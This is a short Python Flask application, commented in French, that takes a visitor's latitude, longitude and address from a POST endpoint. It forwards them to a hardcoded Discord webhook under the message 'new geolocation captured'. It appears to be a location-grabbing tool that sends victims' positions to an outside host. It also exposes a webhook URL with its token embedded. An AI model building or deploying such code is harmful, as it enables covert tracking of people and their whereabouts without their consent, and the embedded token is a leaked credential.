from flask import Flask, render_template, request
import requests

app = Flask(__name__)

# Remplace ceci par ton vrai webhook
WEBHOOK_URL = "https://discord.com/api/webhooks/1367237113220698184/dRNpJg9cI-GD6PMGNHE22eAvjVPOIz5i8zfuIWOVADYCplQvQ3UBcqCL1vFet8CRtcMr"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/send_location', methods=['POST'])
def send_location():
    data = request.get_json()
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    address = data.get('address')

    if latitude and longitude:
        message = {
            "content": f"📍 Nouvelle géolocalisation capturée :\n🌐 Latitude : {latitude}\n🌐 Longitude : {longitude}\n📫 Adresse : {address}"
        }
        try:
            requests.post(WEBHOOK_URL, json=message)
            return {"status": "success"}, 200
        except Exception as e:
            return {"status": "error", "message": str(e)}, 500
    else:
        return {"status": "error", "message": "Coordonnées manquantes"}, 400

if __name__ == '__main__':
    app.run(debug=True)